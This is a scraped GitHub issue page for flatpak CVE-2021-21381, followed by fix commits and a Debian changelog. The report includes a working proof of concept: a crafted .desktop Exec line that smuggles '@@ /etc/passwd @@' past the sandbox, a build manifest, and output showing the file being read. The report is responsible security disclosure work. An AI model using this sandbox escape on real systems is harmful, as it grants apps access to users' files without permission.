<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA/#2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from github.com_5cf352de_20250115_111809.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fissues%2F4146)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fissues%2F4146)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=flatpak%2Fflatpak)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[flatpak](/flatpak)
/
**[flatpak](/flatpak/flatpak)**
Public

* [Notifications](/login?return_to=%2Fflatpak%2Fflatpak) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Fflatpak%2Fflatpak)
* [Star
   4.3k](/login?return_to=%2Fflatpak%2Fflatpak)

* [Code](/flatpak/flatpak)
* [Issues
  969](/flatpak/flatpak/issues)
* [Pull requests
  75](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects
  0](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

Additional navigation options

* [Code](/flatpak/flatpak)
* [Issues](/flatpak/flatpak/issues)
* [Pull requests](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fflatpak%2Fflatpak%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fflatpak%2Fflatpak%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# CVE-2021-21381: Arbitrary file read/write without permissions via special token in .desktop file #4146

Closed

[AntonLydike](/AntonLydike) opened this issue
Mar 2, 2021
· 4 comments
 · Fixed by [#4156](https://github.com/flatpak/flatpak/pull/4156)

Closed

# [CVE-2021-21381: Arbitrary file read/write without permissions via special token in .desktop file](#top) #4146

[AntonLydike](/AntonLydike) opened this issue
Mar 2, 2021
· 4 comments
 · Fixed by [#4156](https://github.com/flatpak/flatpak/pull/4156)

## Comments

[![@AntonLydike](https://avatars.githubusercontent.com/u/14147713?s=80&u=66a0cf2f5cc06b23549596ac3e701fbbba749feb&v=4)](/AntonLydike)

Copy link

### **[AntonLydike](/AntonLydike)** commented [Mar 2, 2021](#issue-819842064)

| Linux distribution and version Ubuntu 20.04 Flatpak version Flatpak 1.10.1 Description of the problem It is possible to construct a malicious `.desktop` file that runs `flatpak run --file-forwarding` with arbitrary arguments, making it possible to bypass sandboxing for all user readable files.  Excuse me for posting this here, but I could not find any responsible disclosure or security issue reporting information. Steps to reproduce When an application supplied `.desktop` file is copied to the host system, flatpak takes steps to guarantee sandboxing while allowing for full functionality of the `.desktop` syntax. As such, it allows flags like `%F` (see [documentation](https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html)), that are used to facilitate "open with..." dialogs. When one or more files are opened with an application, the `%F` flag is replaced with the paths to these files.  Flatpak handles this by detecting flags such as `%F`, `%f`, `%U`, `%u` and adding the `--file-forwarding` argument to the `flatpak run` command, and encapsulating each `%[FfUu]` in `@@` (or `@@u`) as per [the documentation](https://docs.flatpak.org/en/latest/flatpak-command-reference.html), ensuring these file arguments are passed into the applications sandbox.  Further arguments are not checked in the copying process, which makes it possible to pass additional paths encapsulated in `@@` symbols to the `flatpak run` command. See the following proof of concept for further detail:  **app.sh**  ``` #!/bin/sh echo "hello sandboxed world" echo args:$@ exec sh  ```  **app.desktop**  ``` [Desktop Entry] Type=Application Terminal=true Exec=app.sh %F and please give me @@ /etc/passwd @@ Name=Pentest app  ```  **org.pentest.hello.yaml**  ``` app-id: org.pentest.hello runtime: org.freedesktop.Platform runtime-version: '19.08' sdk: org.freedesktop.Sdk command: app.sh modules:     - name: hello     buildsystem: simple     build-commands:         - install -D app.sh       /app/bin/app.sh         - install -D app.desktop  /app/share/applications/org.pentest.hello.desktop     sources:         - type: file         path: app.sh         - type: file         path: app.desktop  ```  Now we can build, install and run the application:  ``` > flatpak-builder --repo=repo --force-clean build/ org.pentest.hello.yaml Emptying app dir 'build/' Downloading sources Starting build of org.pentest.hello Cache miss, checking out last cache hit ======================================================================== Building module hello in /home/it/Desktop/flatpak/.flatpak-builder/build/hello-1 ======================================================================== Running: install -D app.sh       /app/bin/app.sh Running: install -D app.desktop  /app/share/applications/org.pentest.hello.desktop Running: install -D icon.svg     /app/share/icons/hicolor/1238x128/apps/org.pentest.hello.svg Committing stage build-hello to cache Cleaning up Committing stage cleanup to cache Finishing app Exporting share/applications/org.pentest.hello.desktop Exporting share/icons/hicolor/1238x128/apps/org.pentest.hello.svg Please review the exported files and the metadata Committing stage finish to cache Exporting org.pentest.hello to repo Commit: 2b9777d006058f32bc44e74c68c7c750467366468c97b0d6a549f000b8c49110 Metadata Total: 33 Metadata Written: 6 Content Total: 7 Content Written: 1 Content Bytes Written: 102 (102 bytes) Pruning cache > flatpak --user install -y org.pentest.hello Looking for matches…           ID                         Branch          Op         Remote            Download  1. [✓] org.pentest.hello          master          i          test-repo         1,0 kB / 3,2 kB  Installation complete. > update-desktop-database ~/.local/share/applications  ```  The now installed `.desktop` file contains the following:  ``` > cat ~/.local/share/flatpak/exports/share/applications/org.pentest.hello.desktop [Desktop Entry] Type=Application Terminal=true Exec=/usr/bin/flatpak run --branch=master --arch=x86_64 --command=app.sh --file-forwarding org.pentest.hello @@ %F @@ and please give me @@ /etc/passwd @@ Name=Pentest app X-Flatpak=org.pentest.hello  ```  Notice both `@@ %F @@` and `@@ /etc/passwd @@` are present in the arguments of `flatpak run`.  When the file is now executed using it`s desktop entry, we get a shell prompt where we have full read/write access to the specified file:  ``` hello sandboxed world args:and please give me /run/user/1000/doc/8cbe1e81/passwd sh-5.0$ cat /run/user/1000/doc/8cbe1e81/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin (...)  ``` |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👀
5
 Kellegram, A6GibKm, TheEvilSkeleton, gncs, and mkrajnak reacted with eyes emoji

All reactions

* 👀
  5 reactions

[refi64](/refi64)
added a commit
to refi64/flatpak
that referenced
this issue
[Mar 2, 2021](#ref-commit-cb6fce9)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64)

`[Disallow @@ and @](/refi64/flatpak/commit/cb6fce9e4122ace2960c437def3b1a197bb49b3a "Disallow @@ and @@u usage in desktop files

Fixes #4146.")[@U](https://github.com/U) [usage in desktop files](/refi64/flatpak/commit/cb6fce9e4122ace2960c437def3b1a197bb49b3a "Disallow @@ and @@u usage in desktop files

Fixes #4146.")`
…

`[cb6fce9](/refi64/flatpak/commit/cb6fce9e4122ace2960c437def3b1a197bb49b3a)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).
```

[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64)
[refi64](/refi64)
mentioned this issue
[Mar 2, 2021](#ref-pullrequest-820312951)

[Disallow @@ and @@u usage in desktop files
#4148](/flatpak/flatpak/pull/4148)
 Closed

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&u=daeb9f79b5ea25e2a8dd236af718393f95e153c3&v=4)](/smcv)
[smcv](/smcv)
mentioned this issue
[Mar 5, 2021](#ref-pullrequest-823124611)

[Disallow @@ and @@u magic tokens in desktop files
#4156](/flatpak/flatpak/pull/4156)
 Merged

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=80&u=daeb9f79b5ea25e2a8dd236af718393f95e153c3&v=4)](/smcv)

Copy link

Collaborator

### **[smcv](/smcv)** commented [Mar 5, 2021](#issuecomment-791451579)

| Thanks for finding this. I've opened [#4155](https://github.com/flatpak/flatpak/pull/4155) to try to get a better channel for reporting security issues, but I'm not a maintainer, so I need maintainer feedback on what the best private contact channel is.  For CVE-2021-21261 I reported the issue to a maintainer by personal email, but that doesn't really scale well, so hopefully we can set up a better way. |
| --- |

 👍
1
 AntonLydike reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&u=daeb9f79b5ea25e2a8dd236af718393f95e153c3&v=4)](/smcv)
[smcv](/smcv)
mentioned this issue
[Mar 8, 2021](#ref-issue-824633800)

[Please check for / filter out apps with @@ in the Exec field
flathub-infra/backend#46](/flathub-infra/backend/issues/46)

Closed

[![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=80&v=4)](/alexlarsson)

Copy link

Member

### **[alexlarsson](/alexlarsson)** commented [Mar 10, 2021](#issuecomment-795159763)

| Sorry for the late response. I got covid19 so i'm kinda offline... Will try to get a fix out for this though. |
| --- |

 ❤️
3
 AntonLydike, apevec, and mkrajnak reacted with heart emoji

All reactions

* ❤️
  3 reactions

Sorry, something went wrong.

[![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)](/alexlarsson)
[alexlarsson](/alexlarsson)
closed this as [completed](/flatpak/flatpak/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#4156](/flatpak/flatpak/pull/4156)
[Mar 10, 2021](#event-4434936136)

[alexlarsson](/alexlarsson)
pushed a commit
that referenced
this issue
[Mar 10, 2021](#ref-commit-652a28f)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)](/alexlarsson)

`[Disallow @@ and @](/flatpak/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f "Disallow @@ and @@u usage in desktop files

Fixes #4146.")[@U](https://github.com/U) [usage in desktop files](/flatpak/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f "Disallow @@ and @@u usage in desktop files

Fixes #4146.")`
…

`[652a28f](/flatpak/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)`

```
Fixes [#4146](https://github.com/flatpak/flatpak/issues/4146).
```

[alexlarsson](/alexlarsson)
pushed a commit
to alexlarsson/flatpak
that referenced
this issue
[Mar 10, 2021](#ref-commit-e04f806)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)](/alexlarsson)

`[Disallow @@ and @](/alexlarsson/flatpak/commit/e04f8067ed44c853d7ac04deafc3ec08b74f682b "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")[@U](https://github.com/U) [usage in desktop files](/alexlarsson/flatpak/commit/e04f8067ed44c853d7ac04deafc3ec08b74f682b "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")`
…

`[e04f806](/alexlarsson/flatpak/commit/e04f8067ed44c853d7ac04deafc3ec08b74f682b)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/alexlarsson/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
```

[alexlarsson](/alexlarsson)
pushed a commit
that referenced
this issue
[Mar 10, 2021](#ref-commit-8279c58)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)](/alexlarsson)

`[Disallow @@ and @](/flatpak/flatpak/commit/8279c5818425b6812523e3805bbe242fb6a5d961 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")[@U](https://github.com/U) [usage in desktop files](/flatpak/flatpak/commit/8279c5818425b6812523e3805bbe242fb6a5d961 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")`
…

`[8279c58](/flatpak/flatpak/commit/8279c5818425b6812523e3805bbe242fb6a5d961)`

```
Fixes [#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/flatpak/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
```

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=80&u=daeb9f79b5ea25e2a8dd236af718393f95e153c3&v=4)](/smcv)

Copy link

Collaborator

### **[smcv](/smcv)** commented [Mar 10, 2021](#issuecomment-795302663)

| This is now [GHSA-xgh4-387p-hqpp](https://github.com/flatpak/flatpak/security/advisories/GHSA-xgh4-387p-hqpp "GHSA-xgh4-387p-hqpp"). I've requested a CVE ID. |
| --- |

All reactions

Sorry, something went wrong.

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&u=daeb9f79b5ea25e2a8dd236af718393f95e153c3&v=4)](/smcv)
[smcv](/smcv)
changed the title
~~Arbitrary file read/write without permissions~~
CVE-2021-21381: Arbitrary file read/write without permissions via special token in .desktop file
[Mar 11, 2021](#event-4446549408)

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=80&u=daeb9f79b5ea25e2a8dd236af718393f95e153c3&v=4)](/smcv)

Copy link

Collaborator

### **[smcv](/smcv)** commented [Mar 11, 2021](#issuecomment-796918073)

| This is CVE-2021-21381. |
| --- |

All reactions

Sorry, something went wrong.

[a-wai](/a-wai)
pushed a commit
to a-wai/flatpak
that referenced
this issue
[Mar 16, 2021](#ref-commit-2121063)
[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&u=daeb9f79b5ea25e2a8dd236af718393f95e153c3&v=4)](/smcv)

`[Import Debian changes 1.10.1-4](/a-wai/flatpak/commit/212106385f08fd5919473a6938980a0f66bd71ba "Import Debian changes 1.10.1-4

flatpak (1.10.1-4) unstable; urgency=high
.
  * d/p/Disallow-and-u-usage-in-desktop-files.patch:
    Add proposed patch to fix a sandbox escape via crafted .desktop
    files (flatpak#4146). Thanks, Ryan Gonzalez
  * d/p/tests-Remove-hard-coded-references-to-x86_64.patch:
    Add proposed patch to fix some tests on non-x86_64 machines.
    The affected tests were already skipped in schroot/lxc for other
    reasons, but would be run (and fail) on autopkgtest testbeds with
    isolation-machine and working FUSE.
.
flatpak (1.10.1-3) unstable; urgency=medium
.
  * Mark patch as applied upstream
  * Add bugfixes from upstream flatpak-1.10.x branch
    - Add extern \"C\" guards to header files, fixing compilation of C++ code
      such as plasma-discover against GLib 2.67.x
    - Fix memory leaks in the unit tests")`
…

`[2121063](/a-wai/flatpak/commit/212106385f08fd5919473a6938980a0f66bd71ba)`

```
flatpak (1.10.1-4) unstable; urgency=high
.
  * d/p/Disallow-and-u-usage-in-desktop-files.patch:
    Add proposed patch to fix a sandbox escape via crafted .desktop
    files ([flatpak#4146](https://github.com/flatpak/flatpak/issues/4146)). Thanks, Ryan Gonzalez
  * d/p/tests-Remove-hard-coded-references-to-x86_64.patch:
    Add proposed patch to fix some tests on non-x86_64 machines.
    The affected tests were already skipped in schroot/lxc for other
    reasons, but would be run (and fail) on autopkgtest testbeds with
    isolation-machine and working FUSE.
.
flatpak (1.10.1-3) unstable; urgency=medium
.
  * Mark patch as applied upstream
  * Add bugfixes from upstream flatpak-1.10.x branch
    - Add extern "C" guards to header files, fixing compilation of C++ code
      such as plasma-discover against GLib 2.67.x
    - Fix memory leaks in the unit tests
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Oct 1, 2021](#ref-commit-671d73b)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/671d73b75dd8f1bf63eba15c5939b0207addfca8 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/671d73b75dd8f1bf63eba15c5939b0207addfca8 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")`
…

`[671d73b](/debarshiray/flatpak/commit/671d73b75dd8f1bf63eba15c5939b0207addfca8)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
```

[![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&u=8b8c1c6c2204847a14bc4ec2757cc9f6b58e10c6&v=4)](/debarshiray)
[debarshiray](/debarshiray)
mentioned this issue
[Oct 1, 2021](#ref-pullrequest-1013491607)

[[flatpak-1.8.x] Disallow @@ and @@u magic tokens in desktop files
#4442](/flatpak/flatpak/pull/4442)
 Merged

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Oct 4, 2021](#ref-commit-b4788e4)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/b4788e487f86ad8fab688e5cfe443b4288c655c5 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/b4788e487f86ad8fab688e5cfe443b4288c655c5 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")`
…

`[b4788e4](/debarshiray/flatpak/commit/b4788e487f86ad8fab688e5cfe443b4288c655c5)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
```

[smcv](/smcv)
pushed a commit
that referenced
this issue
[Oct 4, 2021](#ref-commit-c54e7c3)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&v=4)](/smcv)

`[Disallow @@ and @](/flatpak/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")[@U](https://github.com/U) [usage in desktop files](/flatpak/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)")`
…

`[c54e7c3](/flatpak/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf)`

```
Fixes [#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/flatpak/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
```

[ahayzen](/ahayzen)
pushed a commit
to ahayzen/flatpak
that referenced
this issue
[Oct 19, 2021](#ref-commit-f1ba70d)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@ahayzen](https://avatars.githubusercontent.com/u/3669750?s=40&v=4)](/ahayzen)

`[Disallow @@ and @](/ahayzen/flatpak/commit/f1ba70d3a6d906ddfadddaa161b129d1d562400c "Disallow @@ and @@u usage in desktop files

Fixes #4146.")[@U](https://github.com/U) [usage in desktop files](/ahayzen/flatpak/commit/f1ba70d3a6d906ddfadddaa161b129d1d562400c "Disallow @@ and @@u usage in desktop files

Fixes #4146.")`
…

`[f1ba70d](/ahayzen/flatpak/commit/f1ba70d3a6d906ddfadddaa161b129d1d562400c)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).
```

[ahayzen](/ahayzen)
pushed a commit
to ahayzen/flatpak
that referenced
this issue
[Oct 20, 2021](#ref-commit-ecb9537)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@ahayzen](https://avatars.githubusercontent.com/u/3669750?s=40&v=4)](/ahayzen)

`[Disallow @@ and @](/ahayzen/flatpak/commit/ecb9537fa91c01f656405712495186c8a8992dd8 "Disallow @@ and @@u usage in desktop files

Fixes #4146.")[@U](https://github.com/U) [usage in desktop files](/ahayzen/flatpak/commit/ecb9537fa91c01f656405712495186c8a8992dd8 "Disallow @@ and @@u usage in desktop files

Fixes #4146.")`
…

`[ecb9537](/ahayzen/flatpak/commit/ecb9537fa91c01f656405712495186c8a8992dd8)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Nov 2, 2021](#ref-commit-0f89343)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/0f89343dbe55bde0fd58c298bd1430e99fb5d4dc "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/0f89343dbe55bde0fd58c298bd1430e99fb5d4dc "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[0f89343](/debarshiray/flatpak/commit/0f89343dbe55bde0fd58c298bd1430e99fb5d4dc)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Nov 2, 2021](#ref-commit-e429cdd)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/e429cdd41416a19375b9989e216a84605300c7fc "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/e429cdd41416a19375b9989e216a84605300c7fc "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[e429cdd](/debarshiray/flatpak/commit/e429cdd41416a19375b9989e216a84605300c7fc)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
(cherry picked from commit [c54e7c3](https://github.com/debarshiray/flatpak/commit/c54e7c3463ceb08671c330f0494218927fe6ceaf))
```

[debarshiray](/debarshiray)
pushed a commit
to debarshiray/flatpak
that referenced
this issue
[Nov 2, 2021](#ref-commit-9c68e30)
[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&u=406c8be284f0d800880de33bddfb2950147896f7&v=4)](/refi64) [![@debarshiray](https://avatars.githubusercontent.com/u/3208107?s=40&v=4)](/debarshiray)

`[Disallow @@ and @](/debarshiray/flatpak/commit/9c68e303e355880d5fb4a5643f4f2bb9287fbc75 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")[@U](https://github.com/U) [usage in desktop files](/debarshiray/flatpak/commit/9c68e303e355880d5fb4a5643f4f2bb9287fbc75 "Disallow @@ and @@u usage in desktop files

Fixes #4146.

(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)
(cherry picked from commit c54e7c3463ceb08671c330f0494218927fe6ceaf)")`
…

`[9c68e30](/debarshiray/flatpak/commit/9c68e303e355880d5fb4a5643f4f2bb9287fbc75)`

```
Fixes [flatpak#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/debarshiray/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
